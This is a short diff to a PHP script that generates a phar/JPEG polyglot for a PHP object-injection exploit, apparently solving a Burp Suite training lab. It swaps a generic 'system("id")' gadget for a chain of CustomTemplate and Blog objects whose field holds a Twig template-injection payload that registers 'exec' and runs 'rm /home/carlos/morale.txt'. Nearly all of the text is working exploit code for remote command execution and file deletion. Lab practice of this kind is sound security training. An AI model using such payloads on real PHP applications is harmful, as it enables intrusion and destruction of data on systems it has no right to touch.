@@ -35,11 +35,23 @@ function generate_polyglot($phar, $jpeg){
 
 
 // pop exploit class
+
+// original
+/*
 class PHPObjectInjection {}
 $object = new PHPObjectInjection;
 $object->inject = 'system("id");';
 $object->out = 'Hallo World';
+*/
 
+// burp phar lab
+class CustomTemplate {}
+class Blog {}
+$object = new CustomTemplate;
+$blog = new Blog;
+$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
+$blog->user = 'user';
+$object->template_file_path = $blog;
 
 
 // config for jpg
